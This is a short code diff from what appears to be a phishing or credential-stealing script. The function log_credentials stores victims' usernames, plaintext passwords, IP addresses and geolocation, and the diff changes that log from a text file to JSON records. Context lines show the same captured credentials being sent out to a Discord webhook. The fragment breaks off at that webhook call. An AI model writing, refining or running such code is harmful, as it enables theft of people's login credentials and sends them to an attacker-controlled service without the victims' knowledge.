@@ -21,13 +21,11 @@ def log_credentials(username, password, ip):
     #print(result)
 
     timestamp = datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S')
-    with open('credentials.log', 'a') as f:
-        f.write(f'Timestamp: {timestamp}\n')
-        f.write(f'Username: {username}\n')
-        f.write(f'Password: {password}\n')
-        f.write(f'IP: {ip}\n')
-        f.write(f'Geolocation: {result}\n')
+    with open('credentials.json', 'a') as f:
+        log_data = {"timestamp": timestamp, "username": username, "password": password, "ip": ip, "geolocation": result}
+        json.dump(log_data, f)
         f.write('\n')
+
 
     # Send credentials and IP to Discord webhook
     webhook = DiscordWebhook(url=WEBHOOK_URL)
